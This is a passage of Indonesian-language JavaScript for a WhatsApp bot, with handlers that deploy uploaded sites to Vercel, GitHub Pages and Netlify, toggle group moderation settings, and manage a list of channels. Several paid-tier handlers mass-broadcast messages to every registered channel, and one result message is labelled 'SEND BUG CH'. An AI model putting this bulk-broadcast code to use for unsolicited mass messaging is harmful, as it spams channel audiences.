        Authorization: `Bearer ${global.vercelToken}`
      },
      body: form
    })

    const result = await res.json().catch(() => ({}))
    if (!res.ok) throw new Error(result.error?.message || res.statusText)

    // ====== Balas hasil deploy ======
    const url = result?.url ? `https://${result.url}` : "Tidak ada URL"
    ReplyLanz(`✅ Website *${webName}* berhasil di-deploy!\n\n🌐 URL: ${url}`)

    // ====== Hapus file sementara ======
    try { fs.unlinkSync(filename) } catch {}

  } catch (err) {
    console.error("❌ Error createweb2:", err)
    ReplyLanz(
      "❌ Gagal deploy ke Vercel!\n\n" +
      "Kemungkinan penyebab:\n" +
      "• File corrupt / salah format\n" +
      "• Token API salah atau expired\n" +
      "• Limit upload Vercel penuh\n\n" +
      `🧩 Error: ${err.message}`
    )
  }
}
break

case 'createweb3': {
  if (!isCreator) return ReplyLanz('Fitur Khusus `Reseller Website`');
  if (!text) return ReplyLanz('Penggunaan: .createweb3 <namadomain>');
  if (!qmsg || !qmsg.mimetype || !/zip|html/.test(qmsg.mimetype)) {
    return ReplyLanz('Balas file .zip atau .html yang valid!');
  }

  const webName = text.trim().toLowerCase().replace(/[^a-z0-9-_]/g, '');
  const domainCheckUrl = `https://${webName}`;

  try {
    const check = await fetch(domainCheckUrl);
    if (check.status === 200) {
      return ReplyLanz(`❌ Nama web *${webName}* sudah digunakan. Gunakan nama lain.`);
    }
  } catch (e) {}

  let quotedFile;
try {
  // 🔁 Tambahkan retry otomatis kalau decrypt gagal
  const tryDownload = async (tries = 2) => {
    for (let i = 0; i < tries; i++) {
      try {
        const buff = await Putzz.downloadAndSaveMediaMessage(qmsg);
        if (buff) return buff
      } catch (err) {
        if (i + 1 === tries) throw err
        await new Promise(r => setTimeout(r, 1500)) // tunggu 1,5 detik
      }
    }
  }

  quotedFile = await tryDownload()

  // ✅ Tambahkan pengecekan buffer kosong
  if (!quotedFile || !Buffer.isBuffer(quotedFile) || quotedFile.length === 0)
    throw new Error("File kosong")

} catch (err) {
  console.error("❌ Download Error:", err)
  return ReplyLanz(
    "❌ Gagal membaca file!\n\n" +
    "Pastikan kamu:\n" +
    "• Balas *file asli* (bukan forward)\n" +
    "• Kirim file *.zip* atau *.html* langsung\n" +
    "• Balas *segera* setelah kirim\n\n" +
    "Kode: BAD_DECRYPT"
  )
}

//  const fs = require('fs');
  const filesToUpload = [];

  if (qmsg.mimetype.includes('zip')) {
    try {
      const unzipper = require('unzipper');
      const zipBuffer = fs.readFileSync(quotedFile);
      const directory = await unzipper.Open.buffer(zipBuffer);

      for (const file of directory.files) {
        if (file.type === 'File') {
          const content = await file.buffer();
          const filePath = file.path.replace(/^\/+/, '').replace(/\\/g, '/');
          filesToUpload.push({
            file: filePath,
            data: content.toString('base64'),
            encoding: 'base64'
          });
        }
      }

      if (!filesToUpload.some(x => x.file.toLowerCase().endsWith('index.html'))) {
        return ReplyLanz('❌ File *index.html* tidak ditemukan dalam ZIP kamu.');
      }
    } catch (e) {
      return ReplyLanz('❌ Gagal membaca isi ZIP. Pastikan ZIP tidak rusak.');
    }

  } else if (qmsg.mimetype.includes('html')) {
    try {
      const htmlBuffer = fs.readFileSync(quotedFile);
      filesToUpload.push({
        file: 'index.html',
        data: htmlBuffer.toString('base64'),
        encoding: 'base64'
      });
    } catch (err) {
      return ReplyLanz('❌ Gagal membaca file HTML.');
    }

  } else {
    return ReplyLanz('❌ Tipe file tidak dikenali. Kirim .zip atau .html.');
  }

  const headers = {
    Authorization: `Bearer ${global.vercelToken}`,
    'Content-Type': 'application/json'
  };

  // Buat project (silent jika gagal)
  await fetch('https://api.vercel.com/v9/projects', {
    method: 'POST',
    headers,
    body: JSON.stringify({ name: webName })
  }).catch(() => {});

  // Deploy
  const deployRes = await fetch('https://api.vercel.com/v13/deployments', {
    method: 'POST',
    headers,
    body: JSON.stringify({
      name: webName,
      project: webName,
      files: filesToUpload,
      projectSettings: { framework: null }
    })
  });

  const deployData = await deployRes.json().catch(() => null);
  if (!deployData || !deployData.url) {
    return ReplyLanz(`❌ Gagal deploy ke Vercel.\n\nCek token, quota, atau format file.`);
  }

  return ReplyLanz(`✅ Website berhasil dibuat!\n\n🌐 https://${webName}.vercel.app`);
}
break;

case 'createwebh2':
case 'cweb2g': {
if (!isCreator) return ReplyLanz('❗ *Anda Tidak memiliki Akses Ke fitur ini.')
  if (!text) return ReplyLanz('Penggunaan: .createweb2 <namaWeb>')
  if (!qmsg || !/html/.test(qmsg.mimetype)) return ReplyLanz('Reply file .html')

  const webName = text.trim().toLowerCase().replace(/[^a-z0-9-_]/g, '')
  const repositoryName = `${webName}-website` // Nama repositori yang akan dibuat

  // 1. Membuat repositori di GitHub jika belum ada
  const githubApiUrl = 'https://api.github.com/user/repos'
  const headers = {
    Authorization: `token ${global.githubToken}`,
    'Content-Type': 'application/json',
  }
  
  const createRepoPayload = {
    name: repositoryName,
    private: false, // Pilih private atau public sesuai kebutuhan Anda
    auto_init: true, // Inisialisasi repositori dengan README
    gitignore_template: 'Node' // Sesuaikan template jika perlu
  }

  try {
    // Cek apakah repositori sudah ada
    const repoRes = await fetch(githubApiUrl, {
      method: 'POST',
      headers,
      body: JSON.stringify(createRepoPayload),
    })

    if (repoRes.status === 422) {
      return ReplyLanz(`❌ Repositori dengan nama *${repositoryName}* sudah ada.`)
    }

    const repoData = await repoRes.json()

    // 2. Download file dari message yang di-reply
    const quotedFile = await Putzz.downloadAndSaveMediaMessage(qmsg)
    const filesToUpload = []

    // 3. Menangani file ZIP dan HTML
    if (qmsg.mimetype.includes('zip')) {
      const unzipper = require('unzipper')
      const zipBuffer = Buffer.from(quotedFile)
      const directory = await unzipper.Open.buffer(zipBuffer)

      for (const file of directory.files) {
        if (file.type === 'File') {
          const content = await file.buffer()
          const filePath = file.path.replace(/^\/+/, '').replace(/\\/g, '/')
          filesToUpload.push({
            file: filePath,
            data: content.toString('base64'),
            encoding: 'base64'
          })
        }
      }

      if (!filesToUpload.some(x => x.file.toLowerCase().endsWith('index.html'))) {
        return ReplyLanz('File index.html tidak ditemukan dalam struktur ZIP.')
      }

    } else if (qmsg.mimetype.includes('html')) {
      filesToUpload.push({
        file: 'index.html',
        data: Buffer.from(quotedFile).toString('base64'),
        encoding: 'base64'
      })
    } else {
      return ReplyLanz('File tidak dikenali. Kirim file .zip atau .html.')
    }

    // 4. Menambahkan file ke repositori GitHub
    const githubRepoUrl = `https://api.github.com/repos/${global.githubUsername}/${repositoryName}/contents`
    for (let file of filesToUpload) {
      const fileUrl = `${githubRepoUrl}/${file.file}`
      await fetch(fileUrl, {
        method: 'PUT',
        headers,
        body: JSON.stringify({
          message: `Add ${file.file}`,
          content: file.data,
        }),
      }).catch(() => {
        return ReplyLanz(`❌ Gagal mengunggah file ${file.file} ke GitHub.`)
      })
    }

    // 5. Mengaktifkan GitHub Pages
    const enablePagesUrl = `https://api.github.com/repos/${global.githubUsername}/${repositoryName}/pages`
    await fetch(enablePagesUrl, {
      method: 'POST',
      headers,
      body: JSON.stringify({
        source: {
          branch: 'main',
          path: '/',
        }
      })
    })

    ReplyLanz(`✅ Website berhasil dibuat di GitHub Pages!\n\n🌐 URL: https://${global.githubUsername}.github.io/${repositoryName}`)

  } catch (error) {
    console.log('Error:', error)
    ReplyLanz(`❌ Terjadi kesalahan saat deploy ke GitHub Pages.`)
  }
}
break

case "cweb3":
case "createweb3": {
//  if (!isCreator && !isResellerdev) return PutzzReplyLanz(mess.owner);

  if (!global.githubToken || global.githubToken.length < 30) {
    return ReplyLanz("🚫 *API Key Belum Disetel Dengan Benar!*");
  }

  if (!text) return ReplyLanz(example('<namaWeb> dengan reply file .zip atau .html'));
  if (!qmsg || !/zip|html/.test(qmsg.mimetype)) return ReplyLanz(example('<namaWeb> dengan reply file .zip atau .html'));

  const webName = text.trim().toLowerCase().replace(/[^a-z0-9-_]/g, '');
  const repositoryName = `${webName}-website`;

//  await reaksi("⏳");

  const headers = {
    Authorization: `token ${global.githubToken}`,
    'Content-Type': 'application/json',
  };

  const createRepoPayload = {
    name: repositoryName,
    private: false,
    auto_init: true,
    gitignore_template: 'Node'
  };

  const fileBuffer = m.quoted ? await m.quoted.download() : await m.download();
  const filesToUpload = [];

  try {
    // Buat repositori GitHub
    const repoRes = await fetch('https://api.github.com/user/repos', {
      method: 'POST',
      headers,
      body: JSON.stringify(createRepoPayload)
    });

    const repoData = await repoRes.json();
    if (repoRes.status === 422) {
//      await reaksi("❌");
      return ReplyLanz(`❌ Repositori *${repositoryName}* sudah ada. Silakan gunakan nama lain.`);
    }
    if (!repoData?.name) {
//      await reaksi("❌");
      return ReplyLanz(`❌ Gagal membuat repositori: ${JSON.stringify(repoData)}`);
    }

    if (qmsg.mimetype.includes('zip')) {
      const unzipper = require('unzipper');
      const directory = await unzipper.Open.buffer(fileBuffer);

      for (const file of directory.files) {
        if (file.type !== 'File') continue;
        const content = await file.buffer();
        const filePath = file.path.replace(/^\/+/, '').replace(/\\/g, '/');
        filesToUpload.push({
          file: filePath,
          data: content.toString('base64'),
        });
      }

      if (!filesToUpload.some(f => f.file.toLowerCase().endsWith('index.html'))) {
//        await reaksi("❌");
        return ReplyLanz('❌ File *index.html* tidak ditemukan dalam ZIP.');
      }

    } else if (qmsg.mimetype.includes('html')) {
      filesToUpload.push({
        file: 'index.html',
        data: fileBuffer.toString('base64'),
      });
    } else {
//      await reaksi("❌");
      return ReplyLanz('❌ Format file tidak didukung. Kirim file .zip atau .html.');
    }

//    await reaksi("⌛");

    // Upload file ke repo
    for (const file of filesToUpload) {
      const fileUrl = `https://api.github.com/repos/${global.githubUsername}/${repositoryName}/contents/${file.file}`;
      const uploadRes = await fetch(fileUrl, {
        method: 'PUT',
        headers,
        body: JSON.stringify({
          message: `Add ${file.file}`,
          content: file.data
        })
      });
      if (!uploadRes.ok) {
        await reaksi("❌");
        return ReplyLanz(`❌ Gagal upload file *${file.file}* ke GitHub.`);
      }
    }

    // Aktifkan GitHub Pages
    const pagesUrl = `https://api.github.com/repos/${global.githubUsername}/${repositoryName}/pages`;
    await fetch(pagesUrl, {
      method: 'POST',
      headers,
      body: JSON.stringify({
        source: {
          branch: 'main',
          path: '/'
        }
      })
    });

//    await reaksi("✅");
    return await ReplyLanz(`✅ Website berhasil dibuat!\n\n🌐 URL: https://${global.githubUsername}.github.io/${repositoryName}`);
  } catch (err) {
    console.error('Deploy Error:', err);
//    await reaksi("❌");
    return ReplyLanz('❌ Terjadi kesalahan saat deploy ke GitHub Pages.');
  }
}
break;

case 'cweb2':
case 'createweb2':
case 'deploynetlify': {
    if (!text) return ReplyLanz('Gunakan: .createweb <namaWeb>');
  if (!m.quoted && !m.quoted2) return ReplyLanz('Balas file .html atau .zip (bisa 2 HTML sekaligus) untuk dijadikan website!');

  if (!text)
    return Putzz.sendMessage(
      m.chat,
      { text: "❌ Masukkan nama domain!\n\nContoh:\n.deploynetlify namasite" },
      { quoted: m }
    )

  const domain = text.trim()

  try {
    // ambil file
    const fileBuffer = await m.quoted.download()
    const filePath = `./${m.sender}.html`
    fs.writeFileSync(filePath, fileBuffer)

    // upload ke Netlify
    const form = new FormData()
    form.append("file", fs.createReadStream(filePath))

    const res = await axios.post(
      "https://api.netlify.com/api/v1/sites",
      form,
      {
        headers: {
          Authorization: `Bearer ${global.netlifyToken}`,
          ...form.getHeaders()
        }
      }
    )

    Putzz.sendMessage(
      m.chat,
      {
        text: `✅ *Deploy berhasil!*\n\n🌍 Domain:\nhttps://${domain}.netlify.app`
      },
      { quoted: m }
    )

    fs.unlinkSync(filePath)

  } catch (e) {
    console.error(e)
    Putzz.sendMessage(
      m.chat,
      { text: "❌ Gagal deploy ke Netlify" },
      { quoted: m }
    )
  }
}
break
case 'deployvercel':
case 'createweb':
case 'cweb': {
if (!text) return ReplyLanz('Gunakan: .cweb <namaWeb>');
if (!m.quoted) return ReplyLanz('Reply file .html atau .zip');

const webName = text.trim().toLowerCase().replace(/[^a-z0-9-]/g, '');
const vercelToken = global.vercelToken;
if (!vercelToken) return ReplyLanz('❌ Token Vercel belum diatur');

const fetch = require("node-fetch");
const AdmZip = require("adm-zip");

let projectFiles = [];

try {

const mime = (m.quoted.msg || m.quoted).mimetype || '';
const fileData = await m.quoted.download();

if (!fileData) return ReplyLanz('❌ Gagal download file');

if (mime.includes("zip")) {

const zip = new AdmZip(fileData);

zip.getEntries().forEach(entry => {
if (!entry.isDirectory) {
projectFiles.push({
file: entry.entryName,
data: zip.readAsText(entry)
});
}
});

}

ReplyLanz("🚀 Deploying website...");

await fetch("https://api.vercel.com/v11/projects", {
method: "POST",
headers: {
Authorization: `Bearer ${vercelToken}`,
"Content-Type": "application/json"
},
body: JSON.stringify({
name: webName,
framework: null
})
}).catch(()=>{});

const deploy = await fetch("https://api.vercel.com/v13/deployments", {
method: "POST",
headers: {
Authorization: `Bearer ${vercelToken}`,
"Content-Type": "application/json"
},
body: JSON.stringify({
name: webName,
files: projectFiles.map(f => ({
file: f.file,
data: f.data
})),
projectSettings: { framework: null },
target: "production"
})
});

const result = await deploy.json();

if (!deploy.ok) {
return ReplyLanz(`❌ Deploy gagal\n${result.error?.message || JSON.stringify(result)}`);
}

ReplyLanz(`✅ Website berhasil dibuat!

🌐 https://${webName}.vercel.app
`);

} catch (err) {
console.log(err);
ReplyLanz("❌ Error saat membuat website");
}

}
break

case 'weblist': {
const fetch = require("node-fetch")
const token = global.vercelToken
if (!token) return ReplyLanz("❌ Token Vercel belum diatur")

try {

let res = await fetch("https://api.vercel.com/v9/projects", {
headers: {
Authorization: `Bearer ${token}`
}
})

let json = await res.json()

if (!json.projects || json.projects.length === 0) {
return ReplyLanz("❌ Tidak ada project")
}

let teks = `🌐 *LIST WEBSITE*\n\n`

json.projects.forEach((p,i)=>{
teks += `${i+1}. ${p.name}\n`
teks += `https://${p.name}.vercel.app\n\n`
})

ReplyLanz(teks)

} catch(e) {
console.log(e)
ReplyLanz("❌ Gagal mengambil list web")
}

}
break
case 'weblist2': {
const fs = require("fs")

if (!fs.existsSync("./webdata")) return ReplyLanz("Belum ada web")

const list = fs.readdirSync("./webdata")

if (!list.length) return ReplyLanz("Kosong")

let teks = "📂 LIST WEB\n\n"

for (let name of list){
teks += `• https://${name}.vercel.app\n`
}

ReplyLanz(teks)
}
break
case 'addweb': {
const fs = require("fs")
const path = require("path")
const fetch = require("node-fetch")

if (!text) return ReplyLanz(".addweb namaweb")
if (!m.quoted) return ReplyLanz("Reply file")

const webName = text.trim().toLowerCase().replace(/[^a-z0-9-]/g,"")
const vercelToken = global.vercelToken

if (!vercelToken) return ReplyLanz("Token vercel belum ada")

const projectDir = `./webstore/${webName}`
const apiDir = `${projectDir}/api`

if (!fs.existsSync(projectDir)) fs.mkdirSync(projectDir,{recursive:true})
if (!fs.existsSync(apiDir)) fs.mkdirSync(apiDir,{recursive:true})

const mime = (m.quoted.msg || m.quoted).mimetype || ""
const buffer = await m.quoted.download()

let fileName = m.quoted.msg?.fileName || "file"

if (!fileName.includes(".")) {
if (mime.includes("html")) fileName += ".html"
else if (mime.includes("javascript")) fileName += ".js"
else if (mime.includes("css")) fileName += ".css"
}

let savePath = `${projectDir}/${fileName}`

if (fileName.endsWith(".js") && fileName !== "index.js") {
savePath = `${apiDir}/${fileName}`
}

fs.writeFileSync(savePath, buffer)

function readFiles(dir){
let files=[]
for (let file of fs.readdirSync(dir)){
const full = path.join(dir,file)
if (fs.statSync(full).isDirectory()){
files = files.concat(readFiles(full))
}else{
files.push({
file: full.replace(projectDir+"/",""),
data: fs.readFileSync(full).toString()
})
}
}
return files
}

const files = readFiles(projectDir)

ReplyLanz("🚀 Deploying...")

await fetch("https://api.vercel.com/v11/projects",{
method:"POST",
headers:{
Authorization:`Bearer ${vercelToken}`,
"Content-Type":"application/json"
},
body:JSON.stringify({ name:webName })
}).catch(()=>{})

const deploy = await fetch("https://api.vercel.com/v13/deployments",{
method:"POST",
headers:{
Authorization:`Bearer ${vercelToken}`,
"Content-Type":"application/json"
},
body:JSON.stringify({
name:webName,
files:files,
projectSettings:{ framework:null },
target:"production"
})
})

const res = await deploy.json()

if (!deploy.ok) {
return ReplyLanz("❌ Deploy gagal\n"+(res.error?.message || JSON.stringify(res)))
}

ReplyLanz(`✅ Deploy sukses

https://${webName}.vercel.app`)
}
break
 case 'cekkartu':
  let nomorTag = '';

  if (m.mentionedJid && m.mentionedJid.length > 0) {
    nomorTag = m.mentionedJid[0];
  } else if (q) {
    nomorTag = q;
  } else {
    return ReplyLanz('Tag atau masukkan nomor HP.\nContoh: cekkartu @tagorang atau cekkartu 0896xxxxxx');
  }

  // ambil nomor & normalisasi
  const nomor = nomorTag.replace(/[^0-9]/g, '').replace(/^62/, '0').slice(0, 12);
  if (nomor.length < 10) return ReplyLanz('Nomor tidak valid.');

  const operator = detectOperator(nomor);
  ReplyLanz(`*Nomor:* ${nomor}\n*Operator:* ${operator}`);
  break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "welcome": {
if (!m.isGroup) return ReplyLanz(mess.group)
if (!isCreator) return ReplyLanz(mess.owner)
if (!text) return ReplyLanz(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].welcome == true) return ReplyLanz(`*Welcome* di grup ini sudah aktif!`)
global.db.groups[m.chat].welcome = true
return ReplyLanz("Berhasil menyalakan *welcome* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].welcome == false) return ReplyLanz(`*Welcome* di grup ini tidak aktif!`)
global.db.groups[m.chat].welcome = false
return ReplyLanz("Berhasil mematikan *welcome* di grup ini")
} else return ReplyLanz(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'antilinkch': {
  if (!m.isGroup) return ReplyLanz('Fitur ini cuma bisa dipakai di grup!');
  if (!isBotAdmins) return ReplyLanz(mess.botAdmin)
  if (!antichannel[m.chat]) antichannel[m.chat] = { active: false, warnings: {}, antichannel: false }

  const argsLower = q.toLowerCase();
  if (argsLower === 'on') {
    antichannel[m.chat].antichannel = true;
    saveAntichannel();
    ReplyLanz('✅ Anti Link Channel WhatsApp AKTIF!');
  } else if (argsLower === 'off') {
    antichannel[m.chat].antichannel = false;
    saveAntichannel();
    ReplyLanz('❌ Anti Link Channel WhatsApp NONAKTIF!');
  } else {
    ReplyLanz(`Contoh:\n*${prefix}antichannel on*\n*${prefix}antichannel off*`);
  }
}
break
case 'antichannel': {
                if (!m.isGroup) return ReplyLanz(mess.OnlyGrup)
                if (!isAdminss && !isCreator) return ReplyLanz(mess.GrupAdmin)
                if (!isBotAdmins) return ReplyLanz(mess.BotAdmin)
                if (args[0] === "on") {
                    if (db.data.chats[m.chat].antichannel) return ReplyLanz(`Udah aktif`)
                    db.data.chats[m.chat].antichannel = true
                    ReplyLanz('Successfully Activate Antilinkchannel All In This Group')
                } else if (args[0] === "off") {
                    if (!db.data.chats[m.chat].antichannel) return ReplyLanz(`Udah nonaktif`)
                    db.data.chats[m.chat].antichannel = false
                    ReplyLanz('Successfully Disabling Antilinkchannel All In This Group')
                } else {
                    let button = [{
                        "name": "quick_reply",
                        "buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
                    }, {
                        "name": "quick_reply",
                        "buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
                    }]
                    Putzz.sendButtonBiasa(m.chat, `*Memasuki ${command} mode*`, `on -- _mengaktifkan_\noff -- _Menonaktifkan_`, button, m)
                }
            }
            break

case "antilink": {
if (!m.isGroup) return ReplyLanz(mess.group)
if (!isCreator) return ReplyLanz(mess.owner)
if (!text) return ReplyLanz(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].antilink == true) return ReplyLanz(`*Antilink* di grup ini sudah aktif!`)
if (global.db.groups[m.chat].antilink2 == true) global.db.groups[m.chat].antilink2 = false
global.db.groups[m.chat].antilink = true
return ReplyLanz("Berhasil menyalakan *antilink* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].antilink == false) return ReplyLanz(`*Antilink* di grup ini tidak aktif!`)
global.db.groups[m.chat].antilink = false
return ReplyLanz("Berhasil mematikan *antilink* di grup ini")
} else return ReplyLanz(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "antilink2": {
if (!m.isGroup) return ReplyLanz(mess.group)
if (!isCreator) return ReplyLanz(mess.owner)
if (!text) return ReplyLanz(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].antilink2 == true) return ReplyLanz(`*Antilink2* di grup ini sudah aktif!`)
if (global.db.groups[m.chat].antilink == true) global.db.groups[m.chat].antilink = false
global.db.groups[m.chat].antilink2 = true
return ReplyLanz("Berhasil menyalakan *antilink2* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].antilink2 == false) return ReplyLanz(`*Antilink2* di grup ini tidak aktif!`)
global.db.groups[m.chat].antilink2 = false
return ReplyLanz("Berhasil mematikan *antilink2* di grup ini")
} else return ReplyLanz(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "mute": {
if (!m.isGroup) return ReplyLanz(mess.group)
if (!isCreator) return ReplyLanz(mess.owner)
if (!text) return ReplyLanz(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].mute == true) return ReplyLanz(`*Mute* di grup ini sudah aktif!`)
global.db.groups[m.chat].mute = true
return ReplyLanz("Berhasil menyalakan *mute* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].mute == false) return ReplyLanz(`*Mute* di grup ini tidak aktif!`)
global.db.groups[m.chat].mute = false
return ReplyLanz("Berhasil mematikan *mute* di grup ini")
} else return ReplyLanz(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "addidch": {
    if (!isCreator) return ReplyLanz(mess.owner);
    if (!text) return ReplyLanz("Harap masukkan link saluran!");

    let channelLink = text.trim();

    if (!channelLink.includes("https://whatsapp.com/channel/")) {
        return ReplyLanz("Link saluran tidak valid! Harus berupa link WhatsApp (https://whatsapp.com/channel/...)");
    }

    let channelId = channelLink.split("https://whatsapp.com/channel/")[1];
    if (!channelId) return ReplyLanz("Gagal mengekstrak ID dari link saluran!");

    try {
        let res = await Putzz.newsletterMetadata("invite", channelId);

        if (!res.id) return ReplyLanz("ID saluran tidak valid!");

        global.channels = loadChannels();

        if (global.channels.includes(res.id)) {
            return ReplyLanz(`ID Saluran *${res.id}* sudah terdaftar!`);
        }

        global.channels.push(res.id);
        saveChannels(global.channels);

        ReplyLanz(`Berhasil menambahkan ID Saluran *${res.id}* dari link:\n${channelLink}\n\nNama Saluran: ${res.name}`);
    } catch (e) {
        console.error(e);
        ReplyLanz("Terjadi kesalahan saat memproses link saluran. Pastikan link valid!");
    }
}
break;

case "delidch": {
    if (!isCreator) return ReplyLanz(mess.owner);
    if (!text) return ReplyLanz("Harap masukkan nomor atau ID saluran yang ingin dihapus!");

    global.channels = loadChannels();

    if (!isNaN(text)) {
        let index = parseInt(text.trim()) - 1;

        if (index < 0 || index >= global.channels.length) {
            return ReplyLanz("Nomor urut tidak valid!");
        }

        let removed = global.channels.splice(index, 1);
        saveChannels(global.channels);

        ReplyLanz(`Berhasil menghapus ID Saluran: *${removed[0]}*`);
    } else {
        let channelId = text.trim();

        if (!global.channels.includes(channelId)) {
            return ReplyLanz("ID Saluran tidak ditemukan!");
        }

        global.channels = global.channels.filter((id) => id !== channelId);
        saveChannels(global.channels);

        ReplyLanz(`Berhasil menghapus ID Saluran: *${channelId}*`);
    }
}
break;

case "listidch": {
    if (!isCreator) return ReplyLanz(mess.owner);

    global.channels = loadChannels();

    if (global.channels.length === 0) {
        return ReplyLanz("Belum ada ID saluran yang terdaftar!");
    }

    let list = global.channels
        .map((id, index) => `${index + 1}. ${id}`)
        .join("\n");

    ReplyLanz(`Daftar ID Saluran Terdaftar:\n\n${list}`);
}
break;

case "jpmchfoto": {
    if (!isCreator && !isJpmch) return ReplyLanz(`${m.pushName}kamu harus upgrade ke premium\natau order premium ke pm`);
    if (!/image/.test(mime)) return ReplyLanz(example("Balas/kirim foto beserta teksnya"));
    let image = await Putzz.downloadAndSaveMediaMessage(qmsg);
    let caption = m.quoted ? m.quoted.text : text;
    let total = 0;

    global.channels = loadChannels();

    if (global.channels.length === 0) 
        return ReplyLanz(`
╔══════════════════════════╗
        ❌ *SALAHAN* ❌
╚══════════════════════════╝
⚠️ Tidak ada saluran terdaftar untuk *JPM*!
Silakan daftarkan saluran terlebih dahulu.
`);

    ReplyLanz(`
╭─❰ *PROCESSING MESSAGE* ❱─╮
📬 *Mengirim Pesan Ke*: 
  ➥ *${global.channels.length} Saluran*
⏳ *Mohon Tunggu...*
╰─────────────────────╯
    `);

    // Kirim pesan ke semua saluran
    for (let id of global.channels) {
        try {
            await Putzz.sendMessage(
                id, 
                {
                    image: await fs.readFileSync(image), 
                    caption: caption, 
                    contextInfo: { forwardingScore: 1, isForwarded: true }
                }, 
                { quoted: qloc }
            );
            total += 1;
        } catch (e) {
            console.log(`⚠️ Gagal mengirim ke ${id}:`, e);
        }
        await sleep(global.delayJpm);
    }

    await fs.unlinkSync(image);

    ReplyLanz(`
╭─❰ *RESULT SUMMARY* ❱─╮
🎉 *Pesan Terkirim*: 
  ➥ *${total} Saluran*
✅ *Status*: Berhasil!
📩 Terima kasih telah menggunakan layanan ini.
╰─────────────────────╯
    `);
}
break;

case "jpmchvideo": {
    if (!isCreator && !isJpmch) return ReplyLanz(`${m.pushName}kamu harus upgrade ke premium\natau order premium ke pm`);
    if (!/video/.test(mime)) return ReplyLanz(example("Balas/kirim video beserta teksnya"));
    
    let video = await Putzz.downloadAndSaveMediaMessage(qmsg);
    let caption = m.quoted ? m.quoted.text : text;
    let total = 0;

    global.channels = loadChannels();

    if (global.channels.length === 0) 
        return ReplyLanz(`
╔══════════════════════════╗
        ❌ *SALAHAN* ❌
╚══════════════════════════╝
⚠️ Tidak ada saluran terdaftar untuk *JPM*!
Silakan daftarkan saluran terlebih dahulu.
`);

    ReplyLanz(`
╭─❰ *PROCESSING MESSAGE* ❱─╮
📬 *Mengirim Pesan Ke*: 
  ➥ *${global.channels.length} Saluran*
⏳ *Mohon Tunggu...*
╰─────────────────────╯
    `);

    // Kirim pesan ke semua saluran
    for (let id of global.channels) {
        try {
            await Putzz.sendMessage(
                id, 
                {
                    video: await fs.readFileSync(video), 
                    caption: caption, 
                    contextInfo: { forwardingScore: 1, isForwarded: true }
                }, 
                { quoted: qloc }
            );
            total += 1;
        } catch (e) {
            console.log(`⚠️ Gagal mengirim ke ${id}:`, e);
        }
        await sleep(global.delayJpm);
    }

    await fs.unlinkSync(video);

    ReplyLanz(`
╭─❰ *RESULT SUMMARY* ❱─╮
🎉 *Pesan Terkirim*: 
  ➥ *${total} Saluran*
✅ *Status*: Berhasil!
📩 Terima kasih telah menggunakan layanan ini.
╰─────────────────────╯
    `);
}
break;

case "jpmch": {
    if (!isCreator && !isJpmch) return ReplyLanz(mess.owner);

    global.delayjpmch = 50; // jeda antar pengiriman pesan ke channel
    const cooldownKey = 'jpmch_global_cooldown';
    global.cooldowns = global.cooldowns || {};

    const now = Date.now();
    const cooldownTime = 300000; // 1 menit
    const sisaWaktu = global.cooldowns[cooldownKey] ? global.cooldowns[cooldownKey] - now : 0;

    if (sisaWaktu > 0) {
        const detik = Math.ceil(sisaWaktu / 1000);
        return ReplyLanz(`⏳ *Fitur sedang digunakan di tempat lain!*\nMohon tunggu *${detik} detik* sebelum bisa digunakan kembali (:`);
    }

    if (!text && !m.quoted) return ReplyLanz("❗ Masukkan teks atau Reply pesan yang ingin dikirim.");

    const teks = m.quoted ? m.quoted.text : text;
    let total = 0;

    global.channels = loadChannels();
    if (!global.channels.length) return ReplyLanz("❌ Tidak ada channel terdaftar.");

    ReplyLanz(` 
  ╭─❰ *PROCESSING MESSAGE* ❱─╮ 
  📬 *Mengirim Pesan Ke*: 
  ➥ *${global.channels.length} Saluran* 
  ⏳ *Mohon Tunggu...* 
  ╰─────────────────────╯ `);

    // Set cooldown global 1 menit
    global.cooldowns[cooldownKey] = now + cooldownTime;

    for (let id of global.channels) {
        try {
            await Putzz.sendMessage(id, { text: teks }, { quoted: m });
            total++;
        } catch (e) {
            console.log(`[JPM] Gagal kirim ke ${id}:`, e.message);
        }
        await sleep(global.delayjpmch);
    }

    ReplyLanz(` 
  ╭─❰ *SUCCESS SEND BUG CH* ❱─╮ 
  🎉 *Pesan Terkirim*: 
  ➥ *${total} Saluran* 
  ✅ *Status*: Berhasil! 
  📩 Harus jeda 10 menit
  ╰──────────────────────╯ `);
}
break

case "share": {
  if (!isCreator && !isjpmch) return ReplyLanz(`${m.pushName}kamu harus upgrade ke premium\natau order premium ke pm`);
  if (!text && !m.quoted) return ReplyLanz(example("Teksnya atau Reply teks"));
  var teks = m.quoted ? m.quoted.text : text;
  let total = 0;
  global.channels = loadChannels();
  if (global.channels.length === 0) return ReplyLanz(` 
  ╔══════════════════════════╗ 
  ║       ❌ *SALAHAN* ❌            ║
  ╚══════════════════════════╝ 
  ⚠️ Tidak ada saluran terdaftar untuk *JPMCH*! 
  Silakan daftarkan saluran terlebih dahulu. `);
  ReplyLanz(` 
  ╭─❰ *PROCESSING MESSAGE* ❱─╮ 
  📬 *Mengirim Pesan Ke*: 
  ➥ *${global.channels.length} Saluran* 
  ⏳ *Mohon Tunggu...* 
  ╰─────────────────────╯ `);
  // Kirim pesan ke semua saluran dengan penundaan
  for (const id of global.channels) {
    try {
      await Putzz.sendMessage(id, { text: teks }, { quoted: m });
      total += 1;
      await sleep(global.delayJpm); // Tambahkan penundaan di sini
